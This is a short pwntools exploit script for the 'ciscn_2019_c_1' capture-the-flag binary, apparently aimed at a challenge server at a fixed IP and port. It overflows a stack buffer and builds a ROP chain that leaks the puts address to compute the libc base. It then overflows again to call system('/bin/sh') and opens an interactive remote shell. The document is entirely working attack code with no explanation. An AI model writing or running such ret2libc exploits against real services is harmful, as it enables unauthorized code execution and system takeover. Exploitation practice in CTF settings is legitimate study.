from pwn import *
#from LibcSearcher import *

#io = process('./ciscn_2019_c_1')
io = remote('210.30.97.133',28037)
elf = ELF('./ciscn_2019_c_1')
#context.log_level = 'debug'

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400c83
encrypt_addr = 0x4009a0
ret = 0x4006b9

payload = b'a' * 0x58
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(encrypt_addr)

io.recvuntil(b'!\n')
io.sendline(b'1')
io.recvuntil(b'd\n')
io.sendline(payload)

io.recvline()
io.recvline()
puts_addr = io.recvuntil(b'\x0a', drop=True)
puts_addr = puts_addr.ljust(0x8, b'\x00')
puts_addr = u64(puts_addr)
log.success("libc base--->  "+hex(puts_addr))

puts_off = 0x0809c0
libc_base = puts_addr - puts_off
system_addr = libc_base + 0x04f440
bin_sh_addr = libc_base + 0x1b3e9a 

payload = b'a' * 0x58
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

io.recvuntil(b'd\n')
io.send(payload)
io.sendline()

io.interactive()
